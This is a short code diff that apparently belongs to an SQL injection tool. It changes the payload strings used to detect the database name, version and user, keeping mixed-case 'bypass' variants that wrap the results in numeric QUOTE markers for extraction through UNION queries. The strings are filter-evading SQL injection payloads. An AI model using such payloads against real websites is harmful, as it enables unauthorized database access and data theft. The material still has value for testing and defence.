@@ -35,26 +35,14 @@ define_union_select_query_php = [
 ]
 
 define_database_detection_query_php = [
-    " cOncAt(\'FINDDATABASE=>\' , dAtaBaSe(),  \'<=FINDDATABASE\')"
-]
-
-define_database_detection_query_php_bypass = [
     " ConcAt(QUOTE(2134115356), dAtaBaSe(), QUOTE(62134115356))"
 ]
 
 define_version_detection_query_php = [
-    " cOncAt(\'FINDVERSION=>\' , VERsion(),  \'<=FINDVERSION\')"
-]
-
-define_version_detection_query_php_bypass = [
     " cOncAt(QUOTE(2134115356) , VERsion(),  QUOTE(62134115356))"
 ]
 
 define_user_detection_query_php = [
-    " cOncAt(\'FINDUSER=>\' , UseR(),  \'<=FINDUSER\')"
-]
-
-define_user_detection_query_php_bypass = [
     " cOncAt(QUOTE(2134115356) , UsEr(),  QUOTE(62134115356))"
 ]
 
